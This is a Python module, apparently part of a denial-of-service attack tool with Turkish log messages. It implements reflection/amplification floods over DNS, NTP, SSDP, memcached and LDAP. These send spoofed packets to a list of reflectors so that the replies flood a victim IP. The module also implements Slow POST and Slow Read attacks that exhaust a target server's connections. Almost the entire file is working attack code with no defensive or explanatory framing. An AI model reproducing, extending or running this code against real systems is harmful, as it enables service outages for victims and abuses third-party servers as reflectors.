import asyncio
import random


async def amplification_sender(
    victim_ip,
    count,
    rps,
    reflector_file,
    amp_type,
    verbose,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    *,
    stats_fn,
    update_live_fn,
    log_info,
    log_error,
    packet_utils,
    send_packet_async_fn,
):
    """Send amplification attack packets to a list of reflectors."""
    try:
        with open(reflector_file, "r") as f:
            reflectors = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_error(f"Yansıtıcı dosyası okunamadı: {e}")
        return stats_fn(attempted=count, sent=0, errors=count)

    if not reflectors:
        log_error("Yansıtıcı listesi boş.")
        return stats_fn(attempted=count, sent=0, errors=count)

    log_info(f"{amp_type.upper()} Amplification saldırısı başlatılıyor. Hedef: {victim_ip}")
    loop = asyncio.get_running_loop()
    tasks = []

    if amp_type == "dns-amp":
        packet_creator = lambda reflector: packet_utils.create_dns_amp_packet(reflector, victim_ip)
    elif amp_type == "ntp-amp":
        packet_creator = lambda reflector: packet_utils.create_ntp_amp_packet(reflector, victim_ip)
    elif amp_type == "ssdp-amp":
        packet_creator = lambda reflector: packet_utils.create_ssdp_amp_packet(reflector, victim_ip)
    elif amp_type == "memcached-amp":
        packet_creator = lambda reflector: packet_utils.create_memcached_amp_packet(reflector, victim_ip)
    elif amp_type == "ldap-amp":
        packet_creator = lambda reflector: packet_utils.create_ldap_amp_packet(reflector, victim_ip)
    else:
        log_error(f"Bilinmeyen amplifikasyon türü: {amp_type}")
        return stats_fn(attempted=count, sent=0, errors=count)

    async def _flush():
        if not tasks:
            return 0
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        ok_count = 0
        err_count = 0
        for r in res:
            if r is True:
                ok_count += 1
            else:
                err_count += 1
        update_live_fn(live_sent, ok_count)
        update_live_fn(live_errors, err_count)
        return ok_count

    sent_ok = 0
    for i in range(count):
        update_live_fn(live_progress, 1)
        reflector = random.choice(reflectors)
        pkt = packet_creator(reflector)
        tasks.append(loop.create_task(send_packet_async_fn(pkt, verbose, i + 1, loop, "udp")))

        if len(tasks) >= 256:
            sent_ok += await _flush()

        if rps > 0:
            await asyncio.sleep(1 / rps)

    if tasks:
        sent_ok += await _flush()

    log_info(f"{amp_type.upper()} Amplification saldırısı tamamlandı.")
    return stats_fn(attempted=count, sent=sent_ok, errors=max(0, count - sent_ok))


async def slow_attack_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    attack_type,
    verbose,
    ssl_context=None,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    *,
    stats_fn,
    update_live_fn,
    log_info,
):
    """Perform slow-rate attacks (Slow POST / Slow Read)."""
    del verbose
    log_info(
        f"{attack_type.upper()} attack initialized. Target: {target_ip}:{target_port}, Concurrency: {concurrency}"
    )

    sem = asyncio.Semaphore(concurrency)
    completed = 0
    errors = 0

    async def _slow_post_worker(worker_id):
        del worker_id
        nonlocal completed, errors
        async with sem:
            update_live_fn(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                del reader
                headers = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                    f"Content-Length: 1000000\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(headers.encode())
                await writer.drain()
                for _ in range(100):
                    if writer.is_closing():
                        break
                    writer.write(b"A")
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                writer.close()
                await writer.wait_closed()
                completed += 1
                update_live_fn(live_sent, 1)
            except Exception:
                errors += 1
                update_live_fn(live_errors, 1)

    async def _slow_read_worker(worker_id):
        del worker_id
        nonlocal completed, errors
        async with sem:
            update_live_fn(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(request.encode())
                await writer.drain()
                while True:
                    chunk = await reader.read(1)
                    if not chunk:
                        break
                    await asyncio.sleep(random.uniform(2, 5))
                writer.close()
                await writer.wait_closed()
                completed += 1
                update_live_fn(live_sent, 1)
            except Exception:
                errors += 1
                update_live_fn(live_errors, 1)

    worker_func = _slow_post_worker if attack_type == "slow-post" else _slow_read_worker
    tasks = [asyncio.create_task(worker_func(i)) for i in range(count)]
    await asyncio.gather(*tasks)
    log_info(f"{attack_type.upper()} attack finished.")
    return stats_fn(attempted=count, sent=completed, errors=max(errors, count - completed))

